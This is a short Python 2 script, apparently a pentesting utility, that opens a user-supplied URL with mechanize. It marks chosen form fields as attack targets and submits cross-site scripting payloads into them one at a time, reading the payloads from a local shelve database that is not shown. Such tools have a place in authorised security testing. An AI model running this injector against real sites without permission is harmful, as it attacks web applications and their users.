##############################################################
#                        Handle XSS Database                 #
##############################################################
import mechanize
import shelve
br = mechanize.Browser()
br.set_handle_robots( False )
url = raw_input("Enter URL: ")
br.set_handle_equiv(True)
br.set_handle_gzip(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.open(url)
s = shelve.open("xss.dat",writeback=True)
for form in br.forms():
    print form

list_attack =[]
list_normal = []
field = int(raw_input('Enter the Number of Field: '))

for i in xrange(0,field):
	name = raw_input('Enter the Field Name: ')
	ch = raw_input("Press Y to Attack on The Field: ")
	if (ch=="Y" or ch == "y"):
		list_attack.append(name)
	else :
		list_normal.append(name)

br.select_form(nr=0)

p =0
flag = 'y'
while flag =="y":
    br.open(url)
    br.select_form(nr=0)
    for i in xrange(0, len(list_attack)):
        attack=list_attack[i]
        br.form[attack] = s['xss'][p]
    for i in xrange(0, len(list_normal)):
        normal=list_normal[i]
        br.form[normal] = '1234'

    print s['xss'][p]
    br.submit()
    ch = raw_input("Press Y to Continue: ")
    p = p+1
    flag = ch.lower()
